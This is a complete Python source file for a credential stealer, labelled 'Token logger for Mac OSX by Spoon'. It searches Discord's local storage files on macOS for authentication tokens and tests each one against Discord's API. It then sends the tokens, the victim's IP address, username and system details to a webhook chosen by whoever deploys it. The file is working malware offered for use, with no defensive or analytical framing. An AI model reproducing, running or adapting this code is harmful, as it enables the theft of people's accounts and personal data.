import requests
import os
import glob
import re
import time
import getpass
import platform
import datetime

WEBHOOK = "WEBHOOK URL HERE"


appdatapath = (f'/Users/{getpass.getuser()}/Library/Application Support')
paths = [
   appdatapath + '/Discord',
   ]
tknpaths = []
def grabTokens(path):
	tokns = []
	appdatapath = os.getenv(f'/Users/{getpass.getuser()}/Library/Application Support')
	files = glob.glob(path + r"/Local Storage/leveldb/*.ldb")
	files.extend(glob.glob(path + r"/Local Storage/leveldb/*.log"))
	for file in files:
		with open( file, 'r',encoding='ISO-8859-1') as content_file:
			try:
				content = content_file.read()
				possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
				tokenpath = ['\n\n' + path + ' :\n']
				if len(possible) > 0:
				
					tknpaths.append(tokenpath)
					tokns.extend(tokenpath + possible)
			except:
				pass
	return tokns
def SendTokensToWebhook(tkns):
	ip = "Unavailable"
	try:
		ip = requests.get("http://checkip.amazonaws.com/").text
	except:
		ip = "Unavailable"
	content = f"```ruby\nPulled {len(tkns) - len(tknpaths)} tokens from {getpass.getuser()} \nip: {ip}\n"
	for tkn in tkns:
		# content += '---------------------------------\n'
		content += tkn + "\n"
		content += '---------------------------------\n'
	content += ("\n\n========================================System Information========================================")
	uname = platform.uname()
	content += (f"\nSystem: {uname.system}")
	content += (f"\nPCName: {uname.node}")
	content += (f"\nRelease: {uname.release}")
	content += (f"\nVersion: {uname.version}")
	content += (f"\nMachine: {uname.machine}")
	content += (f"\nProcessor: {uname.processor}\n\n")
	content += datetime.datetime.now().strftime("%H:%M %p")
	content += "```@everyone"
	payload = {
	"content" : content,
	"avatar_url" : "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
	"username" : "Token logger for Mac OSX by Spoon"
	}
	requests.post(WEBHOOK, data=payload)
tksn = []
for _dir in paths:
	tksn.extend(grabTokens(_dir))
if len(tksn) < 1:
	exit(0)
for check in tksn:
	check = str(check)
	if check.startswith('\n'):
		continue
	else:
		sake = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers = {'Authorization': check})
		try:
		    if sake.status_code == 200:
		        tksn.append('\n\n=====Checker=====\n' + check + ' is valid')
		    else:
		        # tksn.append('\n\n=====Checker=====\n' + check + ' may be invalid')
		        continue
		except:
			pass
SendTokensToWebhook(tksn)
